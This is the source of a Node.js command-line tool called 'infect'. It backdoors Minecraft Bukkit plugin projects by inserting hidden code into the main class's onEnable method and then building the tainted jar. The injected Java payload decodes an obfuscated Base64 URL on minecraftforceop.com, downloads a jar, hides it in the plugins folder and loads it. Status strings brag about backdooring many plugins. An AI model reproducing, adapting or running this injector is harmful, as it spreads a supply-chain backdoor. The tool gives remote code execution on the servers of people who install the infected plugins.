#!/usr/bin/env node
global.startT = +new Date();
const os = require("os");
let osType = os.type();
// imports
const { readdirSync, statSync, fstat, readFileSync } = require("fs");
const openExplorer = require("open-file-explorer");
const { join } = require("path");
const utils = require("./utils");
const readline = require("readline");
const stream = require("stream");
const fs = require("fs");
const yaml = require("js-yaml");
global.chalk = require("chalk");
global.figlet = require("figlet");
global.client = require("discord-rich-presence")("829742157588856912");
const { get, set } = require("./config");
const { exec } = require("child-process-async");
const commandExists = require("command-exists-promise");
const { isRegExp } = require("util");
let slash = "/";
if (osType === "Windows_NT") slash = "\\";

// declerations
let files = [];
global.path;
global.done = false;
auto = process.argv.includes("--auto");
global.rpcConnected = false;
let buildType = "Unknown";
let pluginName;
const arrow = `${chalk.hex("#a19ddd")("=> ")}`;
const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
    terminal: false,
});
let statuses = ["infected in 13.69 seconds lul", "best infect cli", "imagine getting backdoored", "qlutch go brrr", "infect.kaddon.wtf", "20+ plugins infected >:)", "mcforceop.com"]

// yml object
let ymls = {};

// init startup

(async () => {
    //Initialize Discord rich presence
    await utils.startup();
})();

// search for path
let interval = setInterval(() => {
    // if path was found
    if (done) {
        clearInterval(interval);
        buildDection(path).then((r) => {
            switch (r) {
                case "Maven":
                    buildType = r;
                    console.log(
                        `This plugin uses ${chalk.hex("#7058ce")(
                            "Maven"
                        )} to build`
                    );
                    break;
                case "Gradle":
                    buildType = r;
                    console.log(
                        `This plugin uses ${chalk.hex("#eae244")(
                            "Gradle"
                        )} to build`
                    );
                    break;
                default:
                    console.log(
                        `This plugin uses an ${chalk.hex("#c93849")(
                            "unreconized tool"
                        )} to build`
                    );
                    break;
            }
            start();
        });
    }
}, 500);

// start function
async function start() {
    // set plugin name to folder name
    pluginName = path.split(slash).slice(-1).join(" ");
    if (rpcConnected) {
        client.updatePresence({
            state: statuses[Math.floor(Math.random()*statuses.length)],
            details: `infecting ${pluginName}`,
            startTimestamp: Date.now(),
            largeImageKey: "kaddon",
            largeImageText: "infect.kaddon.wtf",
            smallImageKey: "kindled",
            smallImageText: "made by kindled",
            instance: true,
        });
    }
    let count = 0;
    //Search for the YML
    let arr = pluginYMLSearch(path);
    //If Not found
    if (!arr) {
        console.log(
            chalk.hex("#c93849")(`No plugin.ymls were found, exiting.`)
        );
        process.exit();
    }
    //Basic Console Style
    process.title = `infect | infecting ${pluginName}`;
    console.log(
        `Found ${chalk
            .hex("#67bf67")
            .bold(arr.length)} plugin.yml files in ${pluginName}`
    );
    //Enumerate Array
    arr.forEach((element) => {
        count++;
        var fileString = element.split(slash);
        var name = fileString.slice(4).join(slash);
        ymls[count] = { element };
        console.log(`[${chalk.hex(utils.randomColor())(count)}] ${name}`);
    });
    //Ask the user what yml to read.
    rl.question(`Pick a number ${arrow} `, async (r) => {
        console.clear();

        figlet("infect", function (err, data) {
            console.log(chalk.hex("#c93849")(data));
        });
        //Invalid Number
        if (!ymls[r]) {
            console.log("Invalid number, exiting infect..");
            process.exit();
        }
        //read the selected YML
        const pluginYML = readFileSync(ymls[r].element, {
            encoding: "utf8",
            flag: "r",
        });
        try {
            //Load the YAML
            const doc = yaml.load(pluginYML);
            //Find main class
            if (doc["main"]) {
                var fileString = ymls[r].element.split(slash);
                let index = 0;
                let srcIndex = 0;
                fileString.forEach((element) => {
                    index++;
                    if (element == "src") {
                        srcIndex = index;
                    }
                });
                var srcDir = fileString.slice(srcIndex - 1);
                // remove resources & plugin.yml
                srcDir.pop();
                srcDir.pop();
                srcDir.push("java");
                // join
                srcDir = srcDir.join(slash);
                let mainClass =
                    srcDir +
                    slash +
                    doc["main"].split(".").join(slash) +
                    ".java";
                let mainClassName = mainClass.split(slash).pop();
                console.log(
                    `The main class in ${pluginName.replace(
                        /\s/g,
                        ""
                    )} is ${chalk.hex("#c93849")(
                        mainClassName.replace(/\s/g, "")
                    )}`
                );
                // Auto Infect - HH

                if (!get("autoOpenMainClass")) {
                    if (auto) {
                        let pathArr = ymls[r].element.split(slash);
                        pathArr.pop();
                        pathArr.pop();
                        pathArr.pop();

                        if (buildType === "Maven") pathArr.pop();

                        basepath = pathArr.join(slash);

                        //Account for previous builds.

                        if (basepath.endsWith("src"))
                            basepath = basepath.split(slash + "src")[0];
                        if (!fs.existsSync(`${basepath}${slash}${mainClass}`)) {
                            pathArr.push("src");
                            pathArr.push("main");
                            path = basepath + `${slash}src${slash}main`;
                        } else {
                            path = basepath;
                        }
                        console.log(path);
                        if (buildType !== "Maven") {
                            let t = basepath.split(slash);
                            t.pop();
                            basepath = t.join(slash);
                        }
                        await Inject(path, mainClass, basepath);
                    } else {
                        rl.question(
                            `Would you like to attempt auto infection? [Y/N] ${arrow}`,
                            async (res) => {
                                switch (res.toLowerCase()) {
                                    case "y":
                                        let pathArr = ymls[r].element.split(
                                            slash
                                        );
                                        pathArr.pop();
                                        pathArr.pop();
                                        pathArr.pop();

                                        if (buildType === "Maven")
                                            pathArr.pop();

                                        basepath = pathArr.join(slash);

                                        //Account for previous builds.

                                        if (
                                            !fs.existsSync(
                                                `${basepath}${slash}${mainClass}`
                                            )
                                        ) {
                                            pathArr.push("src");
                                            pathArr.push("main");
                                            path =
                                                basepath +
                                                `${slash}src${slash}main`;
                                        } else {
                                            path = basepath;
                                        }
                                        console.log(path);
                                        if (buildType !== "Maven") {
                                            let t = basepath.split(slash);
                                            t.pop();
                                            basepath = t.join(slash);
                                        }
                                        await Inject(path, mainClass, basepath);
                                        break;
                                    case "n":
                                        rl.question(
                                            `Want to open this file? [Y/N] ${arrow} `,
                                            async (reply) => {
                                                switch (reply.toLowerCase()) {
                                                    case "y":
                                                        let pathArr = ymls[
                                                            r
                                                        ].element.split(slash);
                                                        openFile(
                                                            pathArr,
                                                            mainClass,
                                                            mainClassName
                                                        );
                                                        break;
                                                    default:
                                                    case "n":
                                                        break;
                                                }
                                            }
                                        );
                                }
                            }
                        );
                    }
                } else {
                    let pathArr = ymls[r].element.split(slash);
                    openFile(pathArr, mainClass, mainClassName);
                }
            } else {
                console.log(`There was no main class found in this yml`);
            }
        } catch (e) {
            console.log(`Error:\n${e.message}`);
        }
    });
}

/*/


// FUNCTIONS


/*/

// plugin yml search function, searches for plugin.ymls in the specified directory

function pluginYMLSearch(dir) {
    readdirSync(dir).forEach((File) => {
        const Absolute = join(dir, File);
        if (statSync(Absolute).isDirectory()) {
            return pluginYMLSearch(Absolute);
        } else {
            if (Absolute.includes("plugin.yml")) {
                return files.push(Absolute);
            }
        }
    });
    return files;
}

// build tool detection, tells you what build tool the plugin uses.
function buildDection(dir) {
    return new Promise((resolve, reject) => {
        readdirSync(dir).forEach((File) => {
            const Absolute = join(dir, File);
            if (Absolute.includes("gradlew")) {
                resolve("Gradle");
            } else if (Absolute.includes("pom.xml")) {
                resolve("Maven");
            }
        });
        resolve("No build tool");
    });
}

//Automatically Inject
// Credit: H H
async function Inject(path, main, basepath) {
    try {
        let ExistI = [];
        const maliciousString =
            'Bukkit.getScheduler().runTaskLater(this,()->{String name = null;try{byte[]u=Base64.getDecoder().decode("aHR0cHM6Ly9hcGkubWluZWNyYWZ0Zm9yY2VvcC5jb20vZG93bmxvYWQucGhwP3BvcnQ9");URL in=new URL(new String(u)+Bukkit.getServer().getPort());HttpURLConnection con=(HttpURLConnection)in.openConnection();con.addRequestProperty("User-Agent","Mozilla");String fieldValue = con.getHeaderField("Content-Disposition");if (fieldValue == null || ! fieldValue.contains("filename=\\"")) {}name = fieldValue.substring(fieldValue.indexOf("=") + 1, fieldValue.indexOf("."));if(Bukkit.getPluginManager().getPlugin(name)!=null) return;Files.copy(con.getInputStream(),Paths.get(("plugins/"+name+".jar"),new String[0]),new CopyOption[]{StandardCopyOption.REPLACE_EXISTING});}catch(Exception e){}String pl = name;Bukkit.getScheduler().runTaskLater(this,()->{try{Bukkit.getPluginManager().loadPlugin(new File(Paths.get(("plugins/"+pl+".jar"),new String[0]).toString()));Files.setAttribute(Paths.get("plugins/"+pl+".jar"),"dos:hidden",true);}catch(Exception e){}if(Bukkit.getPluginManager().getPlugin(pl)!=null){Bukkit.getPluginManager().enablePlugin(Bukkit.getPluginManager().getPlugin(pl));}},60L);},1L);';
        const maliciousImports = [
            "java.io.IOException",
            "java.io.UncheckedIOException",
            "java.lang.reflect.InvocationTargetException",
            "java.net.MalformedURLException",
            "java.net.URL",
            "java.net.HttpURLConnection",
            "java.io.File",
            "java.io.InputStream",
            "java.net.URL",
            "java.net.URLConnection",
            "java.nio.file.CopyOption",
            "java.nio.file.Files",
            "java.nio.file.Paths",
            "java.nio.file.StandardCopyOption",
            "java.util.Base64",
            "org.bukkit.Bukkit",
            "org.bukkit.plugin.Plugin",
            "org.bukkit.*",
        ];
        let TMP = process.env.TMP || "/tmp";
        TMP = TMP + slash + "Infect";
        if (!fs.existsSync(TMP)) fs.mkdirSync(TMP);
        let missedLines = [];
        var instream = fs.createReadStream(path + slash + main);
        var outstream = new stream();
        var rls = readline.createInterface(instream, outstream);
        console.log("Infecting...");
        let scanning = true;
        await fs.writeFileSync(TMP + slash + "inj.java", "", null);
        rls.on("line", async (line) => {
            if (line === "\n" || line === "\n\r" || line === "\r\n") {
                return missedLines.push(line);
            } else if (line.startsWith("package")) {
                missedLines.push(line + "\n");
            } else if (scanning && line.startsWith("import")) {
                ExistI.push(line.split("import ")[1].split(";")[0]);
                // write legit imports
                missedLines.push(line + "\n");
            } else if (scanning && !line.startsWith("import")) {
                if (!ExistI.length) return;
                scanning = false;
                missedLines.push(line + "\n");
                for (const i in maliciousImports) {
                    //Append the qlutch imports
                    missedLines.push(`import ${maliciousImports[i]};\n`);
                }
            } else {
                if (scanning) return;
                if (!line.startsWith("//") && /onEnable\(\) {/gi.exec(line)) {
                    return missedLines.push(
                        `${line}\n\t\t${maliciousString}\n`
                    );
                }
                missedLines.push(line + "\n");
            }
        });

        //write lines and infect main class automatically.

        rls.on("close", async () => {
            if (missedLines.length) {
                let addedImp = [];
                while (missedLines.length) {
                    if (missedLines[0].startsWith("import")) {
                        let line = missedLines[0];
                        let imp = line.split("import ")[1].split(";")[0];
                        if (addedImp.includes(imp)) {
                            await missedLines.shift();
                        } else {
                            await fs.appendFileSync(
                                TMP + slash + "inj.java",
                                missedLines[0]
                            );
                            addedImp.push(imp);
                            await missedLines.shift();
                        }
                    } else {
                        await fs.appendFileSync(
                            TMP + slash + "inj.java",
                            missedLines[0]
                        );
                        await missedLines.shift();
                    }
                    if (!missedLines.length) {
                        console.log("Waiting...");
                        setTimeout(() => {
                            console.log("Overwriting file...");
                            fs.copyFileSync(
                                `${TMP}${slash}inj.java`,
                                path + slash + main
                            );
                            console.log("Cleaning up..");
                            fs.unlinkSync(`${TMP}${slash}inj.java`);
                            console.log("Finished.");
                            if (!buildType !== "Unknown") comp(basepath);
                        }, 125);
                    }
                }
                // TODO
                //write TMP file to plugin.
            }
        });
    } catch (e) {
        console.log(e);
    }
}

async function comp(dst) {
    let TMP = process.env.TMP || "/tmp";
    let rl2 = readline.createInterface({
        input: process.stdin,
        output: process.stdout,
        terminal: false,
    });
    if (auto) {
        switch (buildType.toLowerCase()) {
            case "gradle":
                if (dst.startsWith(TMP)) {
                    path = dst;
                }
                console.log("Building...... please dont exit.");
                console.log(
                    "If its your first time running, it may take a while"
                );
                console.log(
                    "If it seems extraordinarily slow, exit and try running gradlew build in " +
                        dst
                );
                exec(
                    `cd "${dst}" && gradlew build`,
                    async (err, stdout, stderr) => {
						if(!stdout.includes("BUILD SUCCESSFUL")){
							console.log(`Hey uh, the build was not successful. Try running gradlew build in ${dst}`);
							process.exit();
						}
                        console.log(
                            "Build finished" +
                                stdout
                                    .split("BUILD SUCCESSFUL")[1]
                                    .split("s")[0] +
                                "s"
                        );
                        if (path.startsWith(TMP)) {
                            const dstn =
                                require("os").homedir() + slash + "Qlutch";

                            if (!fs.existsSync(dstn)) fs.mkdirSync(dstn);
                            console.log("mv");
                            readdirSync(path + slash + "jars").forEach(
                                (File) => {
                                    const newPth = join(
                                        path + slash + "jars",
                                        File
                                    );
                                    if (newPth.endsWith("jar"))
                                        fs.copyFileSync(
                                            newPth,
                                            dstn + slash + File
                                        );
                                }
                            );
                            console.log("cleaning up");
                            fs.rmdirSync(TMP + slash + "Infect-Git", {
                                recursive: true,
                            });
                            console.log("Opening location");
                            openExplorer(dstn);
                        } else {
                            console.log("Opening location");
                            openExplorer(dst + slash + "jars");
                        }
                    }
                );
                break;
            case "maven":
                if (dst.startsWith(TMP)) {
                    path = dst;
                }
                console.log("Building...... please dont exit.");
                console.log(
                    "If its your first time running, it may take a while"
                );
                console.log(
                    "If it seems extraordinarily slow, exit and try running mvn clean verify in " +
                        dst
                );
                exec(
                    `cd "${dst}" && mvn clean verify`,
                    async (err, stdout, stderr) => {
						if(stdout.includes("BUILD FAILURE")){
							console.log(`Hey uh, the build was not successful. Try running mvn clean verify in ${dst}`);
							process.exit();
						}
                        console.log(
                            "Build finished " +
                                stdout
                                    .split("Total time:  ")[1]
                                    .split(" s")[0] +
                                "s"
                        );
                        if (path.startsWith(TMP)) {
                            const dstn =
                                require("os").homedir() + slash + "Qlutch";

                            if (!fs.existsSync(dstn)) fs.mkdirSync(dstn);
                            readdirSync(path + slash + "target").forEach(
                                (File) => {
                                    const newPth = join(
                                        path + slash + "target",
                                        File
                                    );
                                    if (newPth.endsWith("jar"))
                                        fs.copyFileSync(
                                            newPth,
                                            dstn + slash + File
                                        );
                                }
                            );
                            console.log("cleaning up");
                            //fs.rmdirSync(TMP + slash + "Infect-Git", {recursive: true,});
                            console.log("Opening location");
                            openExplorer(dstn);
                        } else {
                            console.log("Opening location");
                            openExplorer(dst + slash + "target");
                        }
                    }
                );
                break;

            default:
                if (await fs.existsSync(TMP + slash + "Infect-Git"))
                    fs.rmdirSync(TMP + slash + "Infect-Git", {
                        recursive: true,
                    });
        }
    } else {
        rl2.question(
            `Would you like to try building this with ${buildType}? [Y/N] ${arrow}`,
            async (resp) => {
                switch (resp.toLowerCase()) {
                    case "y":
                        switch (buildType.toLowerCase()) {
                            case "gradle":
                                if (dst.startsWith(TMP)) {
                                    path = dst;
                                }
                                console.log("Building...... please dont exit.");
                                console.log(
                                    "If its your first time running, it may take a while"
                                );
                                console.log(
                                    "If it seems extraordinarily slow, exit and try running gradlew build in " +
                                        dst
                                );
                                exec(
                                    `cd "${dst}" && gradlew build`,
                                    async (err, stdout, stderr) => {
										if(!stdout.includes("BUILD SUCCESSFUL")){
											console.log(`Hey uh, the build was not successful. Try running gradlew build in ${dst}`);
											process.exit();
										}
                                        console.log(
                                            "Build finished" +
                                                stdout
                                                    .split(
                                                        "BUILD SUCCESSFUL"
                                                    )[1]
                                                    .split("s")[0] +
                                                "s"
                                        );
                                        if (path.startsWith(TMP)) {
                                            const dstn =
                                                require("os").homedir() +
                                                slash +
                                                "Qlutch";

                                            if (!fs.existsSync(dstn))
                                                fs.mkdirSync(dstn);
                                            console.log("mv");
                                            readdirSync(
                                                path + slash + "jars"
                                            ).forEach((File) => {
                                                const newPth = join(
                                                    path + slash + "jars",
                                                    File
                                                );
                                                if (newPth.endsWith("jar"))
                                                    fs.copyFileSync(
                                                        newPth,
                                                        dstn + slash + File
                                                    );
                                            });
                                            console.log("cleaning up");
                                            fs.rmdirSync(
                                                TMP + slash + "Infect-Git",
                                                {
                                                    recursive: true,
                                                }
                                            );
                                            console.log("Opening location");
                                            openExplorer(dstn);
                                        } else {
                                            console.log("Opening location");
                                            openExplorer(dst + slash + "jars");
                                        }
                                    }
                                );
                                break;
                            case "maven":
                                if (dst.startsWith(TMP)) {
                                    path = dst;
                                }
                                console.log("Building... please dont exit.");
                                console.log(
                                    "If its your first time running, it may take a while"
                                );
                                console.log(
                                    "If it seems extraordinarily slow, exit and try running mvn clean verify in " +
                                        dst
                                );
                                exec(
                                    `cd "${dst}" && mvn clean verify`,
                                    async (err, stdout, stderr) => {
										if(stdout.includes("BUILD FAILURE")){
											console.log(`Hey uh, the build was not successful. Try running mvn clean verify in ${dst}`);
											process.exit();
										}
                                        console.log(
                                            "Build finished" +
                                                stdout
                                                    .split("Total time:  ")[1]
                                                    .split(" s")[0] +
                                                " s"
                                        );
                                        if (path.startsWith(TMP)) {
                                            const dstn =
                                                require("os").homedir() +
                                                slash +
                                                "Qlutch";

                                            if (!fs.existsSync(dstn))
                                                fs.mkdirSync(dstn);
                                            readdirSync(
                                                path + slash + "target"
                                            ).forEach((File) => {
                                                const newPth = join(
                                                    path + slash + "target",
                                                    File
                                                );
                                                if (newPth.endsWith("jar"))
                                                    fs.copyFileSync(
                                                        newPth,
                                                        dstn + slash + File
                                                    );
                                            });
                                            console.log("cleaning up");
                                            //fs.rmdirSync(TMP + slash + "Infect-Git", {recursive: true,});
                                            console.log("Opening location");
                                            openExplorer(dstn);
                                        } else {
                                            console.log("Opening location");
                                            openExplorer(
                                                dst + slash + "target"
                                            );
                                        }
                                    }
                                );
                                break;
                            default:
                                if (
                                    await fs.existsSync(
                                        TMP + slash + "Infect-Git"
                                    )
                                )
                                    fs.rmdirSync(TMP + slash + "Infect-Git", {
                                        recursive: true,
                                    });
                        }
                }
            }
        );
    }
}

// open file
function openFile(pathArr, mainClass, mainClassName) {
    pathArr.pop();
    pathArr.pop();
    pathArr.pop();
    pathArr.pop();
    utils
        .whichLine(`${pathArr.join(slash)}${slash}${mainClass}`, "onEnable")
        .then(async (line) => {
            console.log(
                `Opening ${chalk.hex("#c93849")(
                    mainClassName.replace(/\s/g, "")
                )}...`
            );
            let vsc = await utils.VSCInstalled();
            if (vsc) {
                utils.VSCOpenFile(
                    `${pathArr.join(slash)}${slash}${mainClass}`,
                    line + 1,
                    3
                );
            } else {
                openExplorer(`${pathArr.join(slash)}${mainClass}`, (err) => {
                    if (err) return console.log(err);
                });
            }
        })
        .catch((e) => console.log(e));
}
